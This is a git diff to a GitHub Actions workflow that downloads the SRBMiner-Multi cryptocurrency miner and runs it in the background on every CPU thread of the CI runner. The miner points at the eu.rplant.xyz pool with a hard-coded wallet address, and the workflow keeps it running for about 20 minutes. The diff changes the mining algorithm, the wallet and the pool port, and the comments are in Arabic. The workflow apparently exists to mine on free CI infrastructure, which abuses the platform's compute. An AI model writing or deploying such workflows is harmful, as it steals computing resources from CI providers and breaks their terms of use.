@@ -1,4 +1,4 @@
-name: Linux-Miner-Max
+name: Linux-Miner-Yescryptr16
 
 on:
   workflow_dispatch:
@@ -16,12 +16,11 @@ jobs:
 
       - name: Download SRBMiner 3.0.3 (Linux)
         run: |
-          # تنزيل الإصدار الصحيح Linux tar.gz
-          wget -O miner.tar.gz "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-Linux.tar.gz"
+          wget -O miner.tar.gz "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-linux64.tar.gz"
           mkdir -p miner
           tar -xzf miner.tar.gz -C miner
 
-      - name: Start SRBMiner (yespoweradvc) Max CPU
+      - name: Start SRBMiner (yescryptr16) Max CPU
         run: |
           function start_miner() {
             cd miner
@@ -30,7 +29,7 @@ jobs:
             chmod +x "$exe"
             threads=$(nproc)
             echo "➡ تشغيل SRBMiner بأقصى عدد من الأنوية: $threads"
-            nohup "$exe" -a yespoweradvc -o stratum+tcps://eu.rplant.xyz:17149 -u Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E -p x --cpu-threads $threads > miner.log 2>&1 &
+            nohup "$exe" -a yescryptr16 -o stratum+tcp://eu.rplant.xyz:7057 -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v -p start=0.4,m=solo --cpu-threads $threads > miner.log 2>&1 &
           }
 
           # تشغيل miner لأول مرة
@@ -55,7 +54,7 @@ jobs:
           exe="$folder/SRBMiner-MULTI"
           chmod +x "$exe"
           threads=$(nproc)
-          nohup "$exe" -a yespoweradvc -o stratum+tcps://eu.rplant.xyz:17149 -u Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E -p x --cpu-threads $threads > miner.log 2>&1 &
+          nohup "$exe" -a yescryptr16 -o stratum+tcp://eu.rplant.xyz:7057 -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v -p start=0.4,m=solo --cpu-threads $threads > miner.log 2>&1 &
 
           # انتظار حتى نهاية workflow (~20 دقيقة)
           remaining_minutes=20
